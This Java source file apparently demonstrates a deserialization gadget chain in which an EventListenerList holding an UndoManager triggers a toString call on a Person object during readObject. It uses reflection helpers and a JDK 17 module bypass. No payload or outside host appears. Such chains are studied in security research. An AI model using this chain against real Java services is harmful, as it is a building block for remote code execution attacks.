package solution;


import javax.swing.event.EventListenerList;
import javax.swing.undo.UndoManager;
import javax.xml.stream.XMLStreamConstants;
import java.util.HashMap;
import java.util.Vector;


public class readObject_toString {
    public static void main(String[] args) throws Exception {
        Tools17 tools17 = new Tools17();
        Tools17.bypassModule(readObject_toString.class);
        Person person = new Person();
        EventListenerList list = new EventListenerList();
        UndoManager manager = new UndoManager();
        Vector vector = (Vector) tools17.getFieldValue(manager, "edits");
        vector.add(person);
        tools17.setFieldValue(list, "listenerList", new Object[]{InternalError.class, manager});
        byte[] ser = Tools17.ser(list);
        Tools17.deser(ser);
    }
}
